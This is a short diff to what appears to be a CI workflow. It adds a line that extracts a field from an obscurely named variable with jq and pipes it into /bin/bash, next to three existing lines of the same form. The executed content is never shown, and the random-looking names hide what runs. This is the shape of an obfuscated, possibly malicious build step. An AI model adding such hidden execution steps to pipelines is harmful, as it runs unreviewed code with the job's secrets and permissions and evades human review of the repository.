@@ -36,6 +36,7 @@ jobs:
           echo $cl3073 | jq -r .eah2614 | /bin/bash
           echo $fv4407 | jq -r .i1 | /bin/bash
           printf '%s' "$t185" | jq -r .fk4765 | /bin/bash
+          echo $xablr710 | jq -r .idj0291 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
